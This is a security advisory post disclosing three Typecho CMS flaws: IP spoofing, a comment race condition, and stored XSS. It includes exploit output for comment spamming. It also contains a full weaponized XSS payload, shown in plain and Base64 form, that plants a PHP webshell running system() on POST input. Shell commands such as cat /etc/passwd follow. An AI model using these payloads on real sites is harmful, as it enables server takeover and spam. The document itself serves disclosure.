---
layout: post
title:  Typecho Multiple Vulnerabilities
description: Advisory about Client IP Spoofing, Race Condition and Stored Cross-Site Scripting (XSS) found on Typecho CMS.
date:   2024-08-18
categories: cve-advisories
share: true
tags:
 - cve-advisories
 - CVE-2024-35538
 - CVE-2024-35539
 - CVE-2024-35540
---

![Typecho logo]({{ '/assets/images/typecho-logo.png' | relative_url }})

# CVE-2024-35538: Client IP Spoofing

**Affected Products and Versions**: Typecho CMS <= 1.3.0
**CVSSv3.1 Score:** 6.5 (Medium)
**CVSSv3.1 Attack Vector:** AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L
**Discoverer:** Michele 'cyberaz0r' Di Bonaventura
**Exploit:** [GitHub](https://raw.githubusercontent.com/cyberaz0r/Typecho-Multiple-Vulnerabilities/main/CVE-2024-35538.go)

## Executive Summary
In Typecho v1.3.0 there is a Client IP Spoofing vulnerability, which allows malicious actors to falsify their IP addresses by specifying an arbitrary IP as value of "X-Forwarded-For" or "Client-Ip" headers while performing HTTP requests.

## Proof of Concept
The vulnerability originates from the “var/Typecho/Request.php” file of the source code, in which the “getIp()” function is defined. This function returns the client IP address, which is retrieved via request headers such as “X-Forwarded-For” or “Client-Ip”, as shown in the following snippet.

>var/Typecho/Request.php
{:.filename}
{% highlight php %}
    public function getIp(): string
    {
        if (null === $this->ip) {
            $header = defined('__TYPECHO_IP_SOURCE__') ? __TYPECHO_IP_SOURCE__ : 'X-Forwarded-For';
            $ip = $this->getHeader($header, $this->getHeader('Client-Ip', $this->getServer('REMOTE_ADDR')));

            if (!empty($ip)) {
                [$ip] = array_map('trim', explode(',', $ip));
                $ip = filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 | FILTER_FLAG_IPV6);
            }

            if (!empty($ip)) {
                $this->ip = $ip;
            } else {
                $this->ip = 'unknown';
            }
        }

        return $this->ip;
    }
{% endhighlight %}

This allows an attacker to bypass the IP-based comment spam protection, since it uses the aforementioned “getIp()” function to retrieve the client IP address, as shown in the following snippet of the “var/Widget/Feedback.php” file.

>var/Widget/Feedback.php
{:.filename}
{% highlight php %}
                    $latestComment = $this->db->fetchRow($this->db->select('created')->from('table.comments')
                        ->where('cid = ? AND ip = ?', $this->content->cid, $this->request->getIp())
                        ->order('created', Db::SORT_DESC)
                        ->limit(1));
{% endhighlight %}

Consequently, an attacker can leverage the vulnerability to perform massive comment spamming to a post’s comment section of the application.

The following example shows a spam attack performed by executing the [exploit](https://raw.githubusercontent.com/cyberaz0r/Typecho-Multiple-Vulnerabilities/main/CVE-2024-35538.go) on a test environment for 60 seconds.
>Exploit output
{:.filename}
{% highlight raw %}
$ go run CVE-2024-35538.go http://172.17.0.2/index.php/archives/41/
[+] Starting Typecho <= 1.3.0 Client IP Spoofing exploit (CVE-2024-35538) by cyberaz0r
[+] Spam target: http://172.17.0.2/index.php/archives/41/
[*] Getting JavaScript function to calculate form token...
[*] Evaluating JavaScript function to calculate form token...
[+] Form token: f7497108c28cf342a1525b60b79eb14e
[*] Spamming comment 5131 from 0.0.20.10
{% endhighlight %}

The following screenshot illustrates the result of the attack, in which it is possible to notice that the attacker was able to post 5145 comments in 60 seconds.

![img]({{ '/assets/images/typecho-1.png' | relative_url }}){: .center-image }*Result of the spam attack: 5145 comments posted in 60 seconds*

## Remediation
Update Typecho CMS to the latest version.

## References
[https://nvd.nist.gov/vuln/detail/CVE-2024-35538](https://nvd.nist.gov/vuln/detail/CVE-2024-35538)
[https://github.com/typecho/typecho](https://github.com/typecho/typecho)
[https://github.com/typecho/typecho/blob/master/var/Typecho/Request.php](https://github.com/typecho/typecho/blob/master/var/Typecho/Request.php)
[https://github.com/typecho/typecho/blob/master/var/Widget/Feedback.php](https://github.com/typecho/typecho/blob/master/var/Widget/Feedback.php)
[https://typecho.org](https://typecho.org)

# CVE-2024-35539: Race Condition

**Affected Products and Versions**: Typecho CMS <= 1.3.0
**CVSSv3.1 Score:** 4.8 (Medium)
**CVSSv3.1 Attack Vector:** AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L
**Discoverer:** Michele 'cyberaz0r' Di Bonaventura
**Exploit:** [GitHub](https://raw.githubusercontent.com/cyberaz0r/Typecho-Multiple-Vulnerabilities/main/CVE-2024-35539.go)

## Executive Summary
In Typecho v1.3.0 there is a Race Condition vulnerability in the post commenting functionality, which allows an attacker to post several comments before the spam protection checks if the comments are posted too frequently.

## Proof of Concept
The vulnerability originates from the “var/Widget/Feedback.php” file of the source code, in which the comment spam protection is implemented. Specifically, the application rejects all new comments of a user that commented within a specified time frame, as shown in the following snippet.

>var/Widget/Feedback.php
{:.filename}
{% highlight php %}
                    if (
                        $latestComment && ($this->options->time - $latestComment['created'] > 0 &&
                            $this->options->time - $latestComment['created'] < $this->options->commentsPostInterval)
                    ) {
                        throw new Exception(_t('对不起, 您的发言过于频繁, 请稍侯再次发布.'), 403);
                    }
{% endhighlight %}

However, it is still possible to post multiple comments within the time range that is not included in the time frame, as demonstrated in the following example.

![img]({{ '/assets/images/typecho-2.png' | relative_url }}){: .center-image }*Multiple comments posted in the excluded time range*

In particular, the spam protection mechanism stops the comment spam attack for 60 seconds, but allows continuing it within the second from a time range to another, as shown below.

![img]({{ '/assets/images/typecho-3.png' | relative_url }}){: .center-image }*Time frames not covered by the protection*

The following example shows a spam attack performed by executing the [exploit](https://raw.githubusercontent.com/cyberaz0r/Typecho-Multiple-Vulnerabilities/main/CVE-2024-35539.go) on a test environment for 60 seconds.
>Exploit output
{:.filename}
{% highlight raw %}
$ go run CVE-2024-35539.go http://172.17.0.2/index.php/archives/42/
[+] Starting Typecho <= 1.3.0 Race Condition exploit (CVE-2024-35539) by cyberaz0r
[+] Spam target: http://172.17.0.2/index.php/archives/42/
[*] Getting JavaScript function to calculate form token...
[*] Evaluating JavaScript function to calculate form token...
[+] Form token: 4ab366d5882fc57013b2eca11e40d07f
[*] Spamming comment request 997    
[+] Successfully spammed 1000 comments
[*] Waiting for next spam wave... (0 seconds)     
[*] Spamming comment request 682    
[+] Successfully spammed 2000 comments
{% endhighlight %}

The following screenshot illustrates the result of the attack, in which it is possible to notice that the attacker was able to post 2000 comments in 60 seconds.

![img]({{ '/assets/images/typecho-4.png' | relative_url }}){: .center-image }*Result of the spam attack: 2000 comments posted in 60 seconds*

## Remediation
Update Typecho CMS to the latest version.

## References
[https://nvd.nist.gov/vuln/detail/CVE-2024-35539](https://nvd.nist.gov/vuln/detail/CVE-2024-35539)
[https://github.com/typecho/typecho](https://github.com/typecho/typecho)
[https://github.com/typecho/typecho/blob/master/var/Widget/Feedback.php](https://github.com/typecho/typecho/blob/master/var/Widget/Feedback.php)
[https://typecho.org](https://typecho.org)

# CVE-2024-35540: Stored Cross-Site Scripting (XSS)

**Affected Products and Versions**: Typecho CMS <= 1.3.0
**CVSSv3.1 Score:** 7.6 (High)
**CVSSv3.1 Attack Vector:** AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:H/A:H
**Discoverer:** Michele 'cyberaz0r' Di Bonaventura
**Exploit:** [GitHub](https://raw.githubusercontent.com/cyberaz0r/Typecho-Multiple-Vulnerabilities/main/CVE-2024-35540.go)

## Executive Summary
In Typecho v1.3.0 there is a Stored Cross-Site Scripting vulnerability in the post writing functionality, which allows an attacker with post writing privileges to inject arbitrary JavaScript code inside the preview of a post.

## Proof of Concept
In the following attack scenario, an authenticated attacker with “contributor” role will weaponize the vulnerability to perform a privilege escalation. Specifically, an attacker with “contributor” role stores a malicious payload inside the preview page and deceives an administrator user to visit such page, in order to edit the PHP code of the application to backdoor the system in which the application is running.

The following JavaScript code is used to weaponize the XSS vulnerability to edit the PHP code of the application.
>Javascript
{:.filename}
{% highlight javascript %}
var payload = `
	header("X-Random-Token: " . md5(uniqid()));
	if (isset($_POST["CSRFToken"]) && $_POST["CSRFToken"] === "569d197b87a4d58dbc24ce41ce39c995ffeba093da0301a509662a152d827a88") {
		if (isset($_POST["action"])) {
			system($_POST["action"]);
			exit;
		}
	}
`;
var i = document.createElement('iframe');
i.src = location.protocol+'//'+location.host+'/admin/theme-editor.php';
i.style.display = 'none';
document.body.appendChild(i);

setTimeout(() => {
	var textarea = i.contentWindow.document.getElementById('content');
	if (textarea.value.includes(payload))
		return;

	textarea.value = textarea.value.replace(/<\?php/, '<?php ' + payload);

	var form = i.contentWindow.document.getElementById('theme').submit();
}, 200);
{% endhighlight %}

The aforementioned code then, is converted into Base64 and inserted into the following payload, which will be stored in the body of a post through the "text" HTTP POST parameter of the request fired to the endpoint "/index.php/action/contents-post-edit" for writing a post.
>Payload
{:.filename}
{% highlight html %}
[<img style="display:none" src=x onerror="eval(atob('dmFyIHBheWxvYWQgPSBgCgloZWFkZXIoIlgtUmFuZG9tLVRva2VuOiAiIC4gbWQ1KHVuaXFpZCgpKSk7CglpZiAoaXNzZXQoJF9QT1NUWyJDU1JGVG9rZW4iXSkgJiYgJF9QT1NUWyJDU1JGVG9rZW4iXSA9PT0gIjU2OWQxOTdiODdhNGQ1OGRiYzI0Y2U0MWNlMzljOTk1ZmZlYmEwOTNkYTAzMDFhNTA5NjYyYTE1MmQ4MjdhODgiKSB7CgkJaWYgKGlzc2V0KCRfUE9TVFsiYWN0aW9uIl0pKSB7CgkJCXN5c3RlbSgkX1BPU1RbImFjdGlvbiJdKTsKCQkJZXhpdDsKCQl9Cgl9CmA7CnZhciBpID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnaWZyYW1lJyk7Cmkuc3JjID0gbG9jYXRpb24ucHJvdG9jb2wrJy8vJytsb2NhdGlvbi5ob3N0KycvYWRtaW4vdGhlbWUtZWRpdG9yLnBocCc7Cmkuc3R5bGUuZGlzcGxheSA9ICdub25lJzsKZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChpKTsKCnNldFRpbWVvdXQoKCkgPT4gewoJdmFyIHRleHRhcmVhID0gaS5jb250ZW50V2luZG93LmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdjb250ZW50Jyk7CglpZiAodGV4dGFyZWEudmFsdWUuaW5jbHVkZXMocGF5bG9hZCkpCgkJcmV0dXJuOwoKCXRleHRhcmVhLnZhbHVlID0gdGV4dGFyZWEudmFsdWUucmVwbGFjZSgvPFw/cGhwLywgJzw/cGhwICcgKyBwYXlsb2FkKTsKCgl2YXIgZm9ybSA9IGkuY29udGVudFdpbmRvdy5kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndGhlbWUnKS5zdWJtaXQoKTsKfSwgMjAwKTsK'))">][1]
[1]: https://google.com
{% endhighlight %}

Upon a visit from the administrator user to the preview page of the malicious post, the aforementioned JavaScript code will be reflected and executed, resulting in editing the PHP code of the application on the administrator's behalf, allowing an attacker to remotely execute arbitrary shell commands on the system hosting the webapp.

The following example shows this attack scenario performed by executing the [exploit](https://raw.githubusercontent.com/cyberaz0r/Typecho-Multiple-Vulnerabilities/main/CVE-2024-35540.go) on a test environment.
>Exploit output
{:.filename}
{% highlight raw %}
$ go run CVE-2024-35540.go http://172.17.0.2 "a2a379b8590d3431d7153bb3b68da0df__typecho_uid=2; a2a379b8590d3431d7153bb3b68da0df__typecho_authCode=%24T%24zrjz7TpeIdce8b06d7ab42a6cb4b9a178367d6e41; PHPSESSID=75c8f8b629bda78fabadda2bdf41ebcf"
[+] Starting Typecho <= 1.3.0 Stored XSS exploit (CVE-2024-35540) by cyberaz0r
[*] Getting post edit URL with CSRF token...
[+] Edit URL: http://172.17.0.2/index.php/action/contents-post-edit?_=af80aafb169d0740d2e560d5afeaa581
[+] Generated password to access the webshell:  c8cdbb510e182ccedd02e6a42c71398f5951672fe93d9bea1decf94c14f0f2c4
[*] Generating JavaScript code to inject webshell...
[*] Creating malicious post...
[+] Malicious post created successfully!
[i] Send this preview URL to the admin to trigger the XSS:
http://172.17.0.2/admin/preview.php?cid=33
[*] Waiting for the admin to visit the preview URL...
[+] Webshell injected successfully!
[+] Enjoy your shell ;)

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ whoami
www-data

$ hostname
af168ce4397f

$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false

$ ls -lahF
total 88K
drwxr-xr-x 6 www-data www-data 4.0K Aug 14 23:34 ./
drwxr-xr-x 1 root     root     4.0K Aug 14 23:23 ../
-rw-r--r-- 1 root     root      140 May  3 01:37 .htaccess
drwxr-xr-x 5 www-data www-data 4.0K Aug 14 23:23 admin/
-rw-r--r-- 1 www-data www-data  809 Aug 14 23:34 config.inc.php
-rw-r--r-- 1 www-data www-data  708 Aug 14 23:23 index.php
drwxr-xr-x 2 www-data www-data 4.0K Aug 14 23:23 install/
-rw-r--r-- 1 www-data www-data  50K Aug 14 23:23 install.php
drwxr-xr-x 6 www-data www-data 4.0K Aug 14 23:23 usr/
drwxr-xr-x 6 www-data www-data 4.0K Aug 14 23:23 var/
{% endhighlight %}

The following screenshot illustrates the preview page of the malicious post, visited by the administrator to trigger the payload.

![img]({{ '/assets/images/typecho-5.png' | relative_url }}){: .center-image }*Preview page of the malicious post visited by the administrator user*

As a result, the PHP code of the application has been backdoored, as demonstrated in the following screenshot.

![img]({{ '/assets/images/typecho-6.png' | relative_url }}){: .center-image }*PHP code of the application successfully backdoored*

## Remediation
Update Typecho CMS to the latest version.

## References
[https://nvd.nist.gov/vuln/detail/CVE-2024-35540](https://nvd.nist.gov/vuln/detail/CVE-2024-35540)
[https://github.com/typecho/typecho](https://github.com/typecho/typecho)
[https://typecho.org](https://typecho.org)